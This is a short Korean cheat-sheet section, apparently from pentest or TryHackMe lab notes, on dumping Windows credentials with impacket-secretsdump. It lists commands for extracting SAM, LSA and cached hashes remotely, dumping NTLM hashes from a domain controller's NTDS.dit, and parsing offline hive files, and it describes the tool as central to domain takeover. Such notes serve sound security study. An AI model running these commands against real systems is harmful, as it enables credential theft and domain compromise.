

### **크리덴셜 덤프 및 파일 공유 (Credential Dumping & File Sharing)**

- **목적:** 원격 시스템의 SAM, LSA Secrets, NTDS.dit 등에서 모든 종류의 크리덴셜을 덤프합니다.
- **특징:** 도메인 장악의 핵심 도구입니다.
```bash
# 원격 시스템의 모든 해시 덤프 (SAM, LSA, cached)
impacket-secretsdump <domain>/<user>:<password>@$target

# 도메인 컨트롤러의 NTDS.dit 덤프
impacket-secretsdump <domain>/<DA_user>:<password>@<DC_IP> -just-dc-ntlm

# GetST로 캐시 생성 후
impacket-secretsdump -k -no-pass HayStack.thm.corp

# ntds.dit, SYSTEM, SAM 파일 획득한 경우
impacket-secretsdump -ntds ntds.dit -sam sam -system system local
```

